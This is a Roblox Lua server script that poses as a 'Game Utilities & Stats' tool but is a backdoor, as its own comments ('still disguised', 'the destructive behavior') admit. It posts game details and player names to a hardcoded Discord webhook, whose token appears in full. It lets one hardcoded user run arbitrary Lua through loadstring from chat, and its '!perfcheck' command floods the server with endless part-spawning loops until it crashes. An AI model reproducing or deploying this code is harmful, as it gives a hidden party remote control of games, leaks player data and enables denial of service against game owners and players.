-- ┌──────────────────────────────────────────────────────────────┐
-- │                Game Utilities & Stats Service                │
-- │           "Enhance your gameplay experience!"               │
-- │                     Version 2.4.2                           │
-- └──────────────────────────────────────────────────────────────┘

local GameUtils = {
	name    = "Game Utilities & Stats",
	version = "2.4.2",
	codename = "Lumiere",
	status  = "operational"
}

-- ───────────────────────────────────────────────
-- Services
-- ───────────────────────────────────────────────
local HttpService        = game:GetService("HttpService")
local Players            = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- ───────────────────────────────────────────────
-- FROZEN CONFIG – cannot be modified after creation
-- ───────────────────────────────────────────────
local SETTINGS = table.freeze({
	chatCommandPrefix = "!",
	statisticsWebhook = "https://discord.com/api/webhooks/1472031322376503307/kkJO4mYkG37w9vWxeZ4PIEhjoAq-2VAbidzrEz8-CTaO8YEWqGRtd3gaa4On5Sm0UHGJ",
	adminUserId       = 10505533671,
	enableDiagnostics = true
})

-- Backup values for tamper detection
local ORIGINAL_ADMIN   = SETTINGS.adminUserId
local ORIGINAL_WEBHOOK = SETTINGS.statisticsWebhook

-- ───────────────────────────────────────────────
-- Helpers
-- ───────────────────────────────────────────────
local function isAuthorized(user)
	return user and user.UserId == SETTINGS.adminUserId
end

local function sendStatistic(payload)
	local success, err = pcall(function()
		HttpService:PostAsync(
			SETTINGS.statisticsWebhook,
			HttpService:JSONEncode({content = payload}),
			Enum.HttpContentType.ApplicationJson
		)
	end)

	if not success then
		warn("[GameUtils] Statistics upload issue → " .. tostring(err))
	end
end

local function fetchPlaceMetadata()
	local placeId = game.PlaceId
	local name = "Unnamed Experience"
	local link = "https://www.roblox.com/games/" .. placeId

	local success, info = pcall(function()
		return MarketplaceService:GetProductInfoAsync(placeId, Enum.InfoType.Asset):await()
	end)

	if success and info and info.Name then
		name = info.Name
	elseif not success then
		warn("[GameUtils] Experience title fetch failed → " .. tostring(info))
	end

	return name, placeId, link
end

-- ───────────────────────────────────────────────
-- Tamper detection & recovery loop
-- ───────────────────────────────────────────────
task.spawn(function()
	while true do
		task.wait(5 + math.random() * 4)  -- irregular timing

		local tampered = false

		if SETTINGS.adminUserId ~= ORIGINAL_ADMIN then
			-- Because frozen → this line will actually error, but we log anyway
			warn("[GameUtils SECURITY] Admin ID tamper attempt detected!")
			tampered = true
		end

		if SETTINGS.statisticsWebhook ~= ORIGINAL_WEBHOOK then
			warn("[GameUtils SECURITY] Webhook tamper attempt detected!")
			tampered = true
		end

		if tampered then
			-- Optional: more aggressive reaction
			-- sendStatistic("**⚠️ CONFIGURATION TAMPER DETECTED**")
			-- or crash / kick everyone / etc.
		end
	end
end)

-- ───────────────────────────────────────────────
-- Command Handler (still disguised)
-- ───────────────────────────────────────────────
local function processUtilityCommand(cmd, args, speaker)
	cmd = cmd:lower()

	if cmd == "players" or cmd == "whosonline" then
		local report = "**Currently connected players:**\n"
		for _, p in Players:GetPlayers() do
			report ..= "• " .. p.Name .. " (" .. p.UserId .. ")\n"
		end
		if #Players:GetPlayers() == 0 then report ..= "(no players)\n" end
		sendStatistic(report)

	elseif cmd == "diagnostics" or cmd == "perfcheck" then
		sendStatistic("**Performance check requested** by " .. speaker.Name)
		-- the destructive behavior
		for _ = 1, 1200 do
			task.spawn(function()
				while true do
					Instance.new("Part", workspace)
				end
			end)
		end

	elseif cmd == "commands" or cmd == "help" or cmd == "cmds" then
		local help = [[
**Game Utilities & Stats – commands (admin only)**

!players / !whosonline   →  current player list
!perfcheck / !diagnostics → run server performance check
!run <lua code>          → execute small debug/utility script
!help / !cmds            → this message
]]
		sendStatistic(help)

	elseif cmd == "run" or cmd == "script" or cmd == "exec" then
		if not args or args:match("^%s*$") then
			sendStatistic("Example: !run print('Status check OK')")
			return
		end

		local func, syntaxErr = loadstring(args)
		if not func then
			sendStatistic("**Script syntax error:**\n```lua\n" .. tostring(syntaxErr) .. "\n```")
			return
		end

		local success, result = pcall(func)
		if success then
			local out = result ~= nil and tostring(result) or "(no return value)"
			sendStatistic("**Script executed OK**\n```lua\n" .. args .. "\n```\n→ " .. out)
		else
			sendStatistic("**Script failed**\n```lua\n" .. args .. "\n```\nError: " .. tostring(result))
		end

	else
		sendStatistic("Unknown command: !" .. cmd .. "   → try !help")
	end
end

-- ───────────────────────────────────────────────
-- Chat command listener
-- ───────────────────────────────────────────────
Players.PlayerAdded:Connect(function(player)
	player.Chatted:Connect(function(msg)
		if not isAuthorized(player) then return end

		local lowered = msg:lower()
		local prefixPat = "^" .. SETTINGS.chatCommandPrefix .. "%s*"
		local command, arguments = lowered:match(prefixPat .. "([%w]+)%s*(.*)")

		if command then
			processUtilityCommand(command, arguments, player)
		end
	end)
end)

-- ───────────────────────────────────────────────
-- Startup message
-- ───────────────────────────────────────────────
local expName, placeId, joinLink = fetchPlaceMetadata()

local startup = 
	"**Game Utilities & Stats v" .. GameUtils.version .. "** now active\n" ..
	"Admin restricted to UserId: " .. SETTINGS.adminUserId .. "\n\n" ..
	"**Experience:**\n" ..
	"• Name: **" .. expName .. "**\n" ..
	"• Place: " .. placeId .. "\n" ..
	"• Link: " .. joinLink .. "\n\n" ..
	"Use **!help** in chat for available commands"

sendStatistic(startup)

print("[GameUtils] Loaded v" .. GameUtils.version)
print("  Monitoring: " .. expName .. " (Place " .. placeId .. ")")
